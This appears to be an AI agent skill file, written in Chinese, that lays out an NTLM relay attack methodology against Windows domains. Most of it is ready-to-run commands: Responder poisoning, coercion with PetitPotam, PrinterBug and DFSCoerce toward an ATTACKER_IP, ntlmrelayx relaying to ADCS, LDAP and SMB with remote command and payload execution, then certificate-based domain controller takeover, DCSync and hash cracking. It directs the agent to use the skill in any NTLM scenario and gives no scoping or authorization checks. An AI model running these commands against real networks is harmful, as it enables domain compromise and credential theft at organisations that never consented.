---
name: ntlm-relay-attack
description: "NTLM 中继攻击方法论。当目标网络存在 NTLM 认证、可以触发 SMB/HTTP 认证请求、或获取到 NetNTLM Hash 时使用。覆盖 Responder 毒化、ntlmrelayx 中继、打印机 Bug 强制认证、RBCD 中继、Shadow Credentials、ADCS 中继。任何涉及 NTLM、Relay、Responder、中继攻击的场景都应使用此技能"
metadata:
  tags: "ntlm,relay,responder,中继,ntlmrelayx,coerce,petitpotam,printerbug,shadow credentials,rbcd,adcs"
  category: "lateral"
---

# NTLM 中继攻击方法论

NTLM Relay 是域渗透最强大的横向移动技术之一——不需要破解密码，直接将认证请求转发到其他服务器获取访问权限。

## ⛔ 深入参考（必读）

- 中继攻击详细配置和各种中继目标 → [references/relay-techniques.md](references/relay-techniques.md)
- 强制认证方法（PetitPotam/PrinterBug/DFSCoerce/文件投毒等） → [references/coercion-methods.md](references/coercion-methods.md)
- Responder 配置与投毒机制（LLMNR/WPAD/mitm6） → [references/responder-config.md](references/responder-config.md)
- SOCKS 代理横向移动（ntlmrelayx SOCKS + proxychains） → [references/socks-pivoting.md](references/socks-pivoting.md)

---

## 核心概念

NTLM Relay 三要素：
1. **触发器**（Trigger）：让目标机器/用户向攻击者发起 NTLM 认证
2. **中继器**（Relay）：将收到的认证请求转发到目标服务
3. **目标**（Target）：接受中继认证的服务器

**前提条件**：目标服务没有启用 SMB 签名（SMB Signing）或 EPA（Extended Protection for Authentication）。

## Phase 1: 环境侦察

### 1.1 检查 SMB 签名
```bash
# SMB 签名未强制 = 可中继
netexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
# 输出没有 signing:True 的主机

# 或用 nmap
nmap -p 445 --script smb2-security-mode 10.0.0.0/24
# "Message signing enabled but not required" = 可中继
```

### 1.2 检查 ADCS Web Enrollment
```bash
# ADCS HTTP 端点通常无 EPA → 可中继
netexec ldap DC_IP -u USER -p PASS -M adcs
# 列出 CA 服务器和模板

# 或直接访问
curl -sk https://CA_SERVER/certsrv/
```

## Phase 2: 攻击决策树

```
有什么条件？
├─ 在内网且有网络接口 → Responder 毒化（被动收集 Hash / 主动中继）
├─ 有域凭据 → 强制认证（PetitPotam/PrinterBug）→ 中继
├─ 目标有 ADCS Web Enrollment → 中继到 ADCS 获取证书 → 域控
├─ 目标关闭 SMB 签名 → 中继到 SMB/LDAP
│   ├─ 中继到 LDAP → RBCD / Shadow Credentials
│   └─ 中继到 SMB → 命令执行
└─ 拿到 NetNTLM Hash 但无法中继 → hashcat 离线破解
详细命令 → [references/relay-techniques.md](references/relay-techniques.md)
```

## Phase 3: Responder 毒化

```bash
# 启动 Responder（关闭 SMB/HTTP 以便 ntlmrelayx 接管）
responder -I eth0 -dwPv

# 或只抓 Hash 不中继
responder -I eth0 -dwPv
# 抓到的 NetNTLMv2 Hash → hashcat -m 5600 破解
```

## Phase 4: 强制认证（Coercion）

```bash
# PetitPotam（最常用，利用 EfsRpcOpenFileRaw）
python3 PetitPotam.py ATTACKER_IP DC_IP
python3 PetitPotam.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP

# PrinterBug（MS-RPRN）
python3 dementor.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP
# 或
python3 printerbug.py DOMAIN/USER:PASS@DC_IP ATTACKER_IP

# DFSCoerce
python3 dfscoerce.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP
```

## Phase 5: 中继到不同目标

### 中继到 ADCS（获取域控证书 → 域管）
```bash
# 最强路径：PetitPotam + ADCS = 域控
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# 触发认证
python3 PetitPotam.py ATTACKER_IP DC_IP

# 获得证书后 → 申请 TGT
certipy auth -pfx dc.pfx -dc-ip DC_IP
# 得到域控 NTLM Hash → DCSync
```

### 中继到 LDAP（RBCD / Shadow Credentials）
```bash
# Shadow Credentials（推荐，不需要创建计算机账户）
ntlmrelayx.py -t ldaps://DC_IP --shadow-credentials --shadow-target DC_HOSTNAME$

# RBCD
ntlmrelayx.py -t ldaps://DC_IP --delegate-access --escalate-user MACHINE$
```

### 中继到 SMB
```bash
ntlmrelayx.py -tf relay_targets.txt -smb2support -c "whoami"
ntlmrelayx.py -tf relay_targets.txt -smb2support -e payload.exe
```

→ 完整中继技术细节 → [references/relay-techniques.md](references/relay-techniques.md)

## 工具速查
| 工具 | 用途 |
|------|------|
| Responder | LLMNR/NBT-NS/mDNS 毒化 |
| ntlmrelayx.py | NTLM 中继核心 |
| PetitPotam | EFS 强制认证 |
| printerbug.py | 打印机强制认证 |
| certipy | ADCS 证书攻击 |
| hashcat -m 5600 | NetNTLMv2 破解 |
